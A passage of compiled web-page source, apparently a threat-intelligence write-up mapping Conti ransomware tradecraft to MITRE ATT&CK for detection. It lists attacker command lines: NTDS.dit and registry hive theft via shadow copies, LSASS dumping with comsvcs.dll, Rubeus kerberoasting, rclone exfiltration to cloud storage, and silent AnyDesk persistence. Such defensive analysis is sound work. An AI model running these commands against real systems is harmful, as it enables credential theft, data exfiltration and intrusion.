\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SYSTEM c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SECURITY c:\\\\temp\\\\log\\\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"7za.exe a -tzip -mx5 \\\\\\\\DC01\\\\C$\\\\temp\\\\log.zip \\\\\\\\DC01\\\\C$\\\\temp\\\\log -pTOPSECRETPASSWORD\\"'))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.")),(0,l.kt)("h3",{id:"conti-used-vssadmin-via-wmi-and-cobalt-strike-to-create-a-volume-shadow-copy-for-collection"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"vssadmin via WMI and Cobalt Strike")," to create a Volume Shadow Copy for Collection."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Collection")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1047",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," ran ",(0,l.kt)("em",{parentName:"td"},"vssadmin")," command on domain controler (list and create Volume Shadow Copy)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin create shadow /for=C: 2>&1\\"'))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"vssadmin.exe")," (Windows Volume Shadow Copy Service administrative tool) allows creating backups of computer files.")),(0,l.kt)("h3",{id:"conti-used-doscmdcopy-command-via-wmi-and-cobalt-strike-to-move-system-files-including-ntdsdit-for-collection"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"doscmd/copy command via WMI and Cobalt Strike")," to move system files including ",(0,l.kt)("em",{parentName:"h3"},"NTDS.dit")," for Collection."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Collection")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1003.003 - OS Credential Dumping: NTDS"),(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003",(0,l.kt)("br",null),"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," ran ",(0,l.kt)("em",{parentName:"td"},"doscmd/copy")," command to copy ",(0,l.kt)("em",{parentName:"td"},"NTDS.dit")," file to ",(0,l.kt)("em",{parentName:"td"},"Temp")," folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\NTDS\\\\NTDS.dit c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SYSTEM c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SECURITY c:\\\\temp\\\\log\\\\"'))))),(0,l.kt)("h3",{id:"conti-used-7zip-via-wmi-and-cobalt-strike-to-archive-collected-files-for-collection"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"7zip via WMI and Cobalt Strike")," to archive collected files for Collection."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Collection")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1560.001 - Archive Collected Data: Archive via Utility")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1560.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"7zip")," to archive collected data."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"7za.exe a -tzip -mx5 \\\\\\\\DC01\\\\C$\\\\temp\\\\log.zip \\\\\\\\DC01\\\\C$\\\\temp\\\\log -pTOPSECRETPASSWORD"))))),(0,l.kt)("h3",{id:"conti-used-ntdsutil-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"ntdsutil")," for Credential Access."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1003.003 - OS Credential Dumping: NTDS")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"ntdsutil")," execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ntdsutil \\"ac in ntds\\" \\"ifm\\" \\"create full c:\\\\windows\\\\temp\\\\crashpad\\\\x\\" q q'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"Ntdsutil.exe")," is a command-line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS)."),(0,l.kt)("li",{parentName:"ul"},"For most of the ",(0,l.kt)("em",{parentName:"li"},"Ntdsutil")," commands, you only need to type the ",(0,l.kt)("em",{parentName:"li"},"first few characters")," of the command name ",(0,l.kt)("em",{parentName:"li"},"instead than the entire command"),"."),(0,l.kt)("li",{parentName:"ul"},'the paremeter "ifm" is modified by "create full"; the specified folder is where the copy will be created.'),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)"},"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)"))),(0,l.kt)("h3",{id:"conti-used-netscanexe-via-cobalt-strike-to-scan-internal-network-for-discovery"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"NetScan.exe via Cobalt Strike")," to scan internal network for Discovery."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1046 - Network Service Scanning")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NetScan.exe")," execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'netscan.exe /hide /auto:\\"result.xml\\" /config:netscan.xml /range:192.168.0.1-192.168.1.255'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NetScan.exe")," output file created."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\NetScan\\\\result.xml"))))),(0,l.kt)("h3",{id:"conti-used-rclone-to-upload-data-to-cloud-storage-for-exfiltration"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"Rclone")," to upload data to cloud storage for Exfiltration."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Exfiltration")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1567 - Exfiltration Over Web Service")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1567"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Rclone")," execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\IT\\\\KLSHARE\\" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\E$\\\\FINANCE\\" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\E$\\\\Data\\" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\FS\\\\\\" remote:NT    -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\Users\\" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3'))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"Rclone")," is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org).")),(0,l.kt)("h3",{id:"conti-used-rubeusexe-via-cobalt-strike-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"Rubeus.exe via Cobalt Strike")," for Credential Access."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"),(0,l.kt)("li",{parentName:"ul"},"T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Rubeus")," execution to output results at ProgramData folder (Kerberoasting)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Rubeus.exe kerberoast /ldapfilter:\\'admincount=1\\' /format:hashcat /outfile:C:\\\\ProgramData\\\\hashes.txt"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1558.004"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Rubeus")," execution to output results at ProgramData folder (AS-REP Roasting)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\ProgramData\\\\asrephashes.txt"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Rubeus.exe")," output file created."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\asrephashes.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\hashes.txt"))))),(0,l.kt)("h3",{id:"conti-used-a-powershell-inline-script-via-cobalt-strike-to-download-and-install-anydesk-remote-access-tool-for-persistence"},"Conti used a ",(0,l.kt)("em",{parentName:"h3"},"PowerShell inline script via Cobalt Strike")," to download and install ",(0,l.kt)("em",{parentName:"h3"},"AnyDesk")," Remote Access Tool for Persistence."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1219 - Remote Access Software"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell ISE")," executed as admin."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell ISE")," performed network connections to download.anydesk.com."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.anydesk.com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1219"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell ISE")," downloads ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\AnyDesk.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1219",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell ISE")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands to install AnyDesk."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\\\ProgramData\\\\AnyDesk.exe --install C:\\\\ProgramData\\\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c echo J9kzQ2Y0qO \\| C:\\\\ProgramData\\\\anydesk.exe --set-password"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"AnyDesk")," is a Remote Desktop Application; it has a free version."),(0,l.kt)("li",{parentName:"ul"},"The password 'J9kzQ2Y0qO' appears on Conti manuals leaked August 2021.")),(0,l.kt)("h3",{id:"conti-used-powershell-commandlets-to-allow-incomming-rdp-connections-on-an-uncommon-port-for-defense-evasion"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-9"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-9"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.004 - Impair Defenses: Disable or Modify System Firewall"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry")),(0,l.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.004"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"New-NetFirewallRule")," commandlet adding new firewall rules for TCP and UDP connections."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol TCP -Action allow'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol UDP -Action allow'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1112"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Windows Registry")," to change port number for Remote Desktop Protocol access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.004"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Restart-Service")," commandlet for restarting ",(0,l.kt)("em",{parentName:"td"},"termservice")," service."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Restart-Service termservice -force"))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"termservice")," is the Remote Desktop Services.")),(0,l.kt)("h3",{id:"conti-used-com-service-dll-via-cobalt-strike-to-dump-lsass-process-memory-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"COM+ Service DLL via Cobalt Strike")," to dump ",(0,l.kt)("em",{parentName:"h3"},"LSASS")," process memory for Credential Access."),(0,l.kt)("h4",{id:"tactic-10"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-10"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," launched ",(0,l.kt)("em",{parentName:"td"},"COM+ Services DLL")," (comsvcs.dll) to create a process memory dump."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID} C:\\\\ProgramData\\\\lsass.dmp full"))))),(0,l.kt)("h4",{id:"notes-6"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"comsvcs.dll"),"  (",(0,l.kt)("em",{parentName:"li"},"COM+ Service DLL")," in Windows) can create process memory dumps."),(0,l.kt)("li",{parentName:"ul"},"Using ",(0,l.kt)("em",{parentName:"li"},"comsvcs.dll MimiDump")," for creating LSASS process memory dumps is a known trick."),(0,l.kt)("li",{parentName:"ul"},"As per the leaked Conti manuals, Contis executed this command via ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike"))),(0,l.kt)("h3",{id:"conti-used-task-manager-over-rdp--to-dump-lsass-process-memory-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"Task Manager over RDP"),"  to dump ",(0,l.kt)("em",{parentName:"h3"},"LSASS")," process memory for Credential Access."),(0,l.kt)("h4",{id:"tactic-11"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-11"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,l.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer")," opened ",(0,l.kt)("em",{parentName:"td"},"Task Manager")," (over ",(0,l.kt)("em",{parentName:"td"},"RDP"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\system32\\taskmgr.exe" /7'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Task Manager")," accessed ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory."),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Task Manager")," created dump file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- 